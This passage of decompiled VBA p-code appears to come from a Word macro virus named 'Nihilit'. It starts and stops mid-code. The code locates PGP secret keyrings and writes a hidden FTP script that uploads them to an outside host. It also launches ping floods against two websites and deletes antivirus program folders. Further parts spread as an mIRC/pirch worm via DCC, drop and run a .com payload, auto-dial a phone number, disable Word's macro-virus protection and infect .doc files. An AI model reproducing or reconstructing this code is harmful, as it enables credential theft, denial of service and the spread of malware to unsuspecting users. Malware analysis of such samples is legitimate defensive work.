' 	Ld pgppath 
' 	LitDI2 0x0001 
' 	Ld Position 
' 	LitDI2 0x0002 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St pgppath 
' Line #115:
' 	ElseBlock 
' Line #116:
' 	GoTo noPGP 
' Line #117:
' 	EndIfBlock 
' Line #118:
' Line #119:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #120:
' 	LitStr 0x000C "\Secring.skr"
' 	MemStWith Filename 
' Line #121:
' 	Ld pgppath 
' 	MemStWith LookIn 
' Line #122:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #123:
' 	LitVarSpecial (True)
' 	MemStWith MatchTextExactly 
' Line #124:
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #125:
' 	ArgsMemCallWith Execute 0x0000 
' Line #126:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St PGP_Sec_Key 
' Line #127:
' 	EndWith 
' Line #128:
' Line #129:
' 	ArgsCall Read 0x0000 
' Line #130:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #131:
' 	Ld NewSecRingFile 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St NewSecRingFile 
' Line #132:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #133:
' 	LitStr 0x0009 "./secring"
' 	Ld NewSecRingFile 
' 	Concat 
' 	LitStr 0x0004 ".skr"
' 	Concat 
' 	St NewSecRingFile 
' Line #134:
' Line #135:
' 	LitStr 0x000A "c:\sys.vxd"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #136:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "ftp http://members.tripod.com/Nihilit/"
' 	PrintItemNL 
' Line #137:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "user nihilit"
' 	PrintItemNL 
' Line #138:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "pass killer"
' 	PrintItemNL 
' Line #139:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "cd incoming"
' 	PrintItemNL 
' Line #140:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "binary"
' 	PrintItemNL 
' Line #141:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "put ""
' 	Ld PGP_Sec_Key 
' 	Concat 
' 	LitStr 0x0003 "" ""
' 	Concat 
' 	Ld NewSecRingFile 
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	PrintItemNL 
' Line #142:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #143:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #144:
' Line #145:
' 	LitStr 0x0027 "command.com /c ftp.exe -n -s:c:\sys.vxd"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #146:
' Line #147:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0008 "Nihilit3"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #148:
' Line #149:
' 	EndIfBlock 
' Line #150:
' Line #151:
' 	Label noPGP 
' Line #152:
' 	LitStr 0x001B " ping -l 5000 -t www.gmx.de"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #153:
' 	LitStr 0x0021 " ping -l 5000 -t www.symantec.com"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #154:
' 	QuoteRem 0x0000 0x0017 "my birthday MsgBox!!!;p"
' Line #155:
' 	LitStr 0x0015 "Coder of Nihilit v4.0"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0021 "---------------------------------"
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0020 "(c) by Necronomikon[Zer0Gravity]"
' 	Concat 
' 	LitDI2 0x0040 
' 	LitStr 0x001B "Happy Birthday Necronomikon"
' 	ArgsCall MsgBox 0x0003 
' Line #156:
' 	ArgsCall (Call) asmdrop 0x0000 
' Line #157:
' 	EndSub 
' Line #158:
' Line #159:
' 	QuoteRem 0x0000 0x001E "---- from NTVCK by me!;p -----"
' Line #160:
' 	FuncDefn (Sub KillAV())
' Line #161:
' 	OnError (Resume Next) 
' Line #162:
' 	LitStr 0x0025 "C:\Progra~1\AntiViral Toolkit Pro\*.*"
' 	ArgsCall Kill 0x0001 
' Line #163:
' 	LitStr 0x0029 "C:\Progra~1\Command Software\F-PROT95\*.*"
' 	ArgsCall Kill 0x0001 
' Line #164:
' 	LitStr 0x0019 "C:\Progra~1\FindVirus\*.*"
' 	ArgsCall Kill 0x0001 
' Line #165:
' 	LitStr 0x0018 "C:\Toolkit\FindVirus\*.*"
' 	ArgsCall Kill 0x0001 
' Line #166:
' 	LitStr 0x001A "C:\Progra~1\Quick Heal\*.*"
' 	ArgsCall Kill 0x0001 
' Line #167:
' 	LitStr 0x0022 "C:\Progra~1\McAfee\VirusScan95\*.*"
' 	ArgsCall Kill 0x0001 
' Line #168:
' 	LitStr 0x0020 "C:\Progra~1\Norton AntiVirus\*.*"
' 	ArgsCall Kill 0x0001 
' Line #169:
' 	LitStr 0x000E "C:\TBAVW95\*.*"
' 	ArgsCall Kill 0x0001 
' Line #170:
' 	LitStr 0x000B "C:\VS95\*.*"
' 	ArgsCall Kill 0x0001 
' Line #171:
' 	LitStr 0x0014 "C:\eSafe\Protect\*.*"
' 	ArgsCall Kill 0x0001 
' Line #172:
' 	LitStr 0x0013 "C:\PC-Cillin 95\*.*"
' 	ArgsCall Kill 0x0001 
' Line #173:
' 	LitStr 0x0013 "C:\PC-Cillin 97\*.*"
' 	ArgsCall Kill 0x0001 
' Line #174:
' 	LitStr 0x000E "C:\f-macro\*.*"
' 	ArgsCall Kill 0x0001 
' Line #175:
' 	LitStr 0x0012 "C:\Progra~1\FWIN32"
' 	ArgsCall Kill 0x0001 
' Line #176:
' 	EndSub 
' Line #177:
' Line #178:
' 	FuncDefn (Sub Delay())
' Line #179:
' 	OnError (Resume Next) 
' Line #180:
' 	QuoteRem 0x0000 0x002A "some Delaystuff from NTVCK v2.0 by me!!!;p"
' Line #181:
' 	LitStr 0x0001 "1"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Control Panel\Microsoft Input Devices\Mouse"
' 	LitStr 0x0010 "DoubleClickSpeed"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #182:
' 	LitStr 0x0001 "1"
' 	LitStr 0x0000 ""
' 	LitStr 0x0040 "HKEY_CURRENT_USER\Control Panel\Microsoft Input Devices\Keyboard"
' 	LitStr 0x000D "KeyboardSpeed"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #183:
' 	LitStr 0x0004 "1000"
' 	LitStr 0x0000 ""
' 	LitStr 0x001F "HKEY_CURRENT_USER\ControlPanel\"
' 	LitStr 0x000D "MenuShowDelay"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #184:
' 	EndSub 
' Line #185:
' Line #186:
' 	FuncDefn (Sub UMP())
' Line #187:
' 	QuoteRem 0x0000 0x001E "-=[ULTRAS MACRO POLYMORPHIC]=-"
' Line #188:
' 	OnError (Resume Next) 
' Line #189:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x001C 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St PoNu 
' Line #190:
' 	StartForVariable 
' 	Ld Mutate 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld PoNu 
' 	For 
' Line #191:
' 	LitStr 0x0007 "nihilit"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St PoRL 
' Line #192:
' 	ArgsLd Rnd 0x0000 
' 	Ld PoRL 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St PoLi 
' Line #193:
' 	Ld Rnd 
' 	LitDI2 0x01C7 
' 	Mul 
' 	St a 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0050 
' 	Mul 
' 	St B 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00A0 
' 	Mul 
' 	St c 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00B4 
' 	Mul 
' 	St d 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0031 
' 	Mul 
' 	St E 
' Line #194:
' 	Ld PoLi 
' 	Ld vbTab 
' 	LitStr 0x0004 "Rem "
' 	Concat 
' 	Ld a 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld B 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld c 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld d 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld E 
' 	Concat 
' 	LitStr 0x0007 "nihilit"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #195:
' 	StartForVariable 
' 	Ld Mutate 
' 	EndForVariable 
' 	NextVar 
' Line #196:
' 	EndSub 
' Line #197:
' 	QuoteRem 0x0000 0x000F "---------------"
' Line #198:
' Line #199:
' 	FuncDefn (Sub IRC())
' Line #200:
' 	OnError (Resume Next) 
' Line #201:
' 	Reparse 0x007E "If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Necronomikon\ZeroGravity\Nihilit", "Irc") &lt;&gt; "True" Then"
' Line #202:
' 	EndIfBlock 
' Line #203:
' 	LitStr 0x0012 "C:\mirc\Script.ini"
' 	ArgsCall Kill 0x0001 
' Line #204:
' 	LitStr 0x0012 "c:\mirc\script.ini"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #205:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "[SCRIPT]"
' 	PrintItemNL 
' Line #206:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "n0=on 1:start:{"
' 	PrintItemNL 
' Line #207:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "n1=on 1:join:#:{"
' 	PrintItemNL 
' Line #208:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0048 "n2=if ( $nick == $me ) { halt } | .dcc send $nick c:\Windows\nihilit.zip"
' 	PrintItemNL 
' Line #209:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "n3= }"
' 	PrintItemNL 
' Line #210:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0035 "n4=on 1:input:*:.msg #nihilit [( $+ $active $+ ) $1-]"
' 	PrintItemNL 
' Line #211:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "n5=on 1:text:*:?:.msg #nihilit [( $+ $active $+ ) $1-]"
' 	PrintItemNL 
' Line #212:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003B "n6=on 1:FILESENT:*.*:/dcc send $nick C:\Windows\Nihilit.zip"
' 	PrintItemNL 
' Line #213:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002D "n7=on 1:connect:.msg #nihilit by Necronomikon"
' 	PrintItemNL 
' Line #214:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "n8=  /msg #nihilit Im Infected With A Virus from Necronomikon"
' 	PrintItemNL 
' Line #215:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "n9= /part #nihilit"
' 	PrintItemNL 
' Line #216:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "n10= /clear"
' 	PrintItemNL 
' Line #217:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "n11= /motd"
' 	PrintItemNL 
' Line #218:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0045 "n12=on 1:connect:.msg #nihilit Alive! $ip on $server $+ : $+ $port $+"
' 	PrintItemNL 
' Line #219:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0050 "n13=on 1:connect:/raw privmsg Necronomi HeyBabe! $ip on $server $+ : $+ $port $+"
' 	PrintItemNL 
' Line #220:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "n14= }"
' 	PrintItemNL 
' Line #221:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "n15=On 1:Connect:{"
' 	PrintItemNL 
' Line #222:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "n16=/run attrib +h script.ini"
' 	PrintItemNL 
' Line #223:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "n17=/run attrib +r script.ini"
' 	PrintItemNL 
' Line #224:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "n18=/run attrib +s script.ini"
' 	PrintItemNL 
' Line #225:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "n19= }"
' 	PrintItemNL 
' Line #226:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 ";IRC.Worm for Nihilit by Necronomikon"
' 	PrintItemNL 
' Line #227:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #228:
' 	LitStr 0x0016 "C:\Windows\eventss.vxd"
' 	ArgsCall Kill 0x0001 
' Line #229:
' 	LitStr 0x0016 "C:\Windows\eventss.vxd"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #230:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "[Levels]"
' 	PrintItemNL 
' Line #231:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "Enabled=1"
' 	PrintItemNL 
' Line #232:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Count=1"
' 	PrintItemNL 
' Line #233:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "Level1=000-Unknowns"
' 	PrintItemNL 
' Line #234:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "000-UnknownsEnabled=1"
' 	PrintItemNL 
' Line #235:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #236:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "[000-Unknowns]"
' 	PrintItemNL 
' Line #237:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "User1=*!*@*"
' 	PrintItemNL 
' Line #238:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "UserCount=1"
' 	PrintItemNL 
' Line #239:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "Event1=;Nihilit by Necronomikon"
' 	PrintItemNL 
' Line #240:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0037 "Event2=ON JOIN:#:/dcc send $nick C:\Windows\Nihilit.zip"
' 	PrintItemNL 
' Line #241:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "EventCount=2"
' 	PrintItemNL 
' Line #242:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #243:
' 	LitStr 0x0015 "C:\pirch98\events.ini"
' 	ArgsCall Kill 0x0001 
' Line #244:
' 	LitStr 0x0015 "C:\pirch32\events.ini"
' 	ArgsCall Kill 0x0001 
' Line #245:
' 	LitStr 0x0016 "C:\Windows\eventss.vxd"
' 	St SourceFile 
' Line #246:
' 	LitStr 0x0015 "C:\pirch98\events.ini"
' 	St DestinationFile 
' Line #247:
' 	Ld SourceFile 
' 	Ld DestinationFile 
' 	ArgsCall FileCopy 0x0002 
' Line #248:
' 	LitStr 0x0016 "C:\Windows\eventss.vxd"
' 	St SourceFilez 
' Line #249:
' 	LitStr 0x0015 "C:\pirch32\events.ini"
' 	St DestinationFilez 
' Line #250:
' 	Ld SourceFilez 
' 	Ld DestinationFilez 
' 	ArgsCall FileCopy 0x0002 
' Line #251:
' 	EndSub 
' Line #252:
' Line #253:
' 	FuncDefn (Sub Phonecall())
' Line #254:
' 	OnError (Resume Next) 
' Line #255:
' 	QuoteRem 0x0000 0x0039 "makes a mobile-phonecall to a person i really don't like!"
' Line #256:
' 	QuoteRem 0x0000 0x0013 "thx to vic for code"
' Line #257:
' 	LitStr 0x000A "dialer.exe"
' 	Ld vbNormalFocus 
' 	ArgsCall Shell 0x0002 
' Line #258:
' 	LitStr 0x000B "01601524002"
' 	ParamNamed String$ 
' 	LitVarSpecial (True)
' 	ParamNamed wait 
' 	ArgsCall SendKeys 0x0002 
' Line #259:
' 	LitStr 0x0002 "%d"
' 	ParamNamed String$ 
' 	LitVarSpecial (True)
' 	ParamNamed wait 
' 	ArgsCall SendKeys 0x0002 
' Line #260:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #261:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #262:
' 	LitStr 0x0001 "~"
' 	ParamNamed String$ 
' 	LitVarSpecial (True)
' 	ParamNamed wait 
' 	ArgsCall SendKeys 0x0002 
' Line #263:
' 	LitStr 0x0002 "%h"
' 	ParamNamed String$ 
' 	LitVarSpecial (True)
' 	ParamNamed wait 
' 	ArgsCall SendKeys 0x0002 
' Line #264:
' 	LitStr 0x0005 "%{F4}"
' 	ParamNamed String$ 
' 	LitVarSpecial (True)
' 	ParamNamed wait 
' 	ArgsCall SendKeys 0x0002 
' Line #265:
' 	EndSub 
' Line #266:
' Line #267:
' 	FuncDefn (Sub asmdrop())
' Line #268:
' 	OnError (Resume Next) 
' Line #269:
' 	QuoteRem 0x0000 0x0018 "Drop Mosquito by Deadman"
' Line #270:
' 	LitStr 0x0008 "C:\6.com"
' 	LitDI2 0x0003 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #271:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "•‡ÖÍ!Ã"
' 	PrintItemNL 
' Line #272:
' 	LitDI2 0x0003 
' 	Sharp 
' 	Close 0x0001 
' Line #273:
' 	LitStr 0x0008 "C:\6.com"
' 	ArgsCall Shell 0x0001 
' Line #274:
' 	EndSub 
' Line #275:
' Line #276:
' 	FuncDefn (Sub ToolsOptions())
' Line #277:
' 	OnError (Resume Next) 
' Line #278:
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #279:
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #280:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #281:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #282:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #283:
' 	ArgsCall (Call) Phonecall 0x0000 
' Line #284:
' 	EndSub 
' Line #285:
' Line #286:
' 	FuncDefn (Sub ToolsSecurity())
' Line #287:
' 	OnError (Resume Next) 
' Line #288:
' 	LitVarSpecial (True)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #289:
' 	Ld wdDialogToolsSecurity 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #290:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #291:
' 	ArgsCall (Call) Phonecall 0x0000 
' Line #292:
' 	EndSub 
' Line #293:
' Line #294:
' 	FuncDefn (Sub FileTemplates())
' Line #295:
' 	OnError (Resume Next) 
' Line #296:
' 	ArgsCall (Call) Phonecall 0x0000 
' Line #297:
' 	EndSub 
' Line #298:
' Line #299:
' 	FuncDefn (Sub ToolsMacro())
' Line #300:
' 	OnError (Resume Next) 
' Line #301:
' 	ArgsCall (Call) Stealth 0x0000 
' Line #302:
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' Line #303:
' 	ArgsCall (Call) Phonecall 0x0000 
' Line #304:
' 	EndSub 
' Line #305:
' Line #306:
' 	FuncDefn (Sub ViewVBCode())
' Line #307:
' 	OnError (Resume Next) 
' Line #308:
' 	ArgsCall (Call) Stealth 0x0000 
' Line #309:
' 	LitVarSpecial (True)
' 	St ShowVisualBasicEditor 
' Line #310:
' 	ArgsCall (Call) Phonecall 0x0000 
' Line #311:
' 	EndSub 
' Line #312:
' Line #313:
' 	FuncDefn (Sub Stealth())
' Line #314:
' 	OnError (Resume Next) 
' Line #315:
' 	LineCont 0x0004 09 00 04 00
' 	Ld NormalTemplate 
' 	MemLd New 
' 	ParamNamed Source 
' 	LitStr 0x0007 "Nihilit"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #316:
' 	LineCont 0x0004 09 00 04 00
' 	Ld ActiveDocument 
' 	MemLd New 
' 	ParamNamed Source 
' 	LitStr 0x0007 "Nihilit"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #317:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #318:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #319:
' 	EndSub 
' Line #320:
' Line #321:
' 	FuncDefn (Sub HelpAbout())
' Line #322:
' 	OnError (Resume Next) 
' Line #323:
' 	Ld WordBasic 
' 	ArgsMemCall FileNew 0x0000 
' Line #324:
' 	Ld WordBasic 
' 	ArgsMemCall ToggleFull 0x0000 
' Line #325:
' 	Ld WordBasic 
' 	ArgsMemCall DocMaximize 0x0000 
' Line #326:
' 	LitStr 0x000D "Comic Sans MS"
' 	Ld WordBasic 
' 	ArgsMemCall Font 0x0001 
' Line #327:
' 	LitDI2 0x003C 
' 	Ld WordBasic 
' 	ArgsMemCall FontSize 0x0001 
' Line #328:
' 	Ld WordBasic 
' 	ArgsMemCall Bold 0x0000 
' Line #329:
' 	LitStr 0x000B "Check this!"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #330:
' 	Ld WordBasic 
' 	ArgsMemCall StartOfLine 0x0000 
' Line #331:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall CharRight 0x0002 
' Line #332:
' 	LitStr 0x0002 "48"
' 	ParamNamed Points 
' 	LitDI2 0x0006 
' 	ParamNamed Color 
' 	Ld WordBasic 
' 	ArgsMemCall FormatFont 0x0002 
' Line #333:
' 	Ld WordBasic 
' 	ArgsMemCall EndOfLine 0x0000 
' Line #334:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #335:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #336:
' 	LitDI2 0x0030 
' 	Ld WordBasic 
' 	ArgsMemCall FontSize 0x0001 
' Line #337:
' 	LitStr 0x0022 "Nihilit was coded by Necronomikon."
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #338:
' 	EndSub 
' Line #339:
' Line #340:
' 	FuncDefn (Sub FileExit())
' Line #341:
' 	OnError (Resume Next) 
' Line #342:
' 	ArgsCall (Call) Nihilit 0x0000 
' Line #343:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #344:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #345:
' 	Ld CurDir 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St pName 
' Line #346:
' 	Ld pName 
' 	LitStr 0x0005 "*.doc"
' 	Concat 
' 	Ld sAttr 
' 	ArgsLd Dir 0x0002 
' 	St fName 
' Line #347:
' 	Reparse 0x006A "If (fName &lt;&gt; "") And ((fName &lt;&gt; ".") And (fName &lt;&gt; "..")) Then InfectDoc = pName & fName"
' Line #348:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed Filename 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #349:
' 	ArgsCall (Call) Nihilit 0x0000 
' Line #350:
' 	Reparse 0x001C "Do While (fName &lt;&gt; "")"
' Line #351:
' 	ArgsLd Dir 0x0000 
' 	St fName 
' Line #352:
' 	LineCont 0x0004 00 00 E6 FF
' 	Reparse 0x004F "If (fName &lt;&gt; "") And((fName &lt;&gt; ".") And (fName &lt;&gt; "..")) Then"
' Line #353:
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' Line #354:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed Filename 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #355:
' 	ArgsCall (Call) Nihilit 0x0000 
' Line #356:
' 	EndIfBlock 
' Line #357:
' 	Loop 
' Line #358:
' 	LitStr 0x0002 "p:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #359:
' 	Ld svt$ 
' 	ParamNamed Filename 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #360:
' 	LitStr 0x0002 "h:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #361:
' 	Ld svt$ 
' 	ParamNamed Filename 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #362:
' 	LitStr 0x0002 "f:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #363:
' 	Ld svt$ 
' 	ParamNamed Filename 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #364:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #365:
' 	EndSub 
' Line #366:
' 	FuncDefn (Sub AutoExit())
' Line #367:
' 	OnError (Resume Next) 
' Line #368:
' 	ArgsCall (Call) Nihilit 0x0000 
' Line #369:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #370:
' 	Ld CurDir 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St pName 
' Line #371:
' 	Ld pName 
' 	LitStr 0x0005 "*.doc"
' 	Concat 
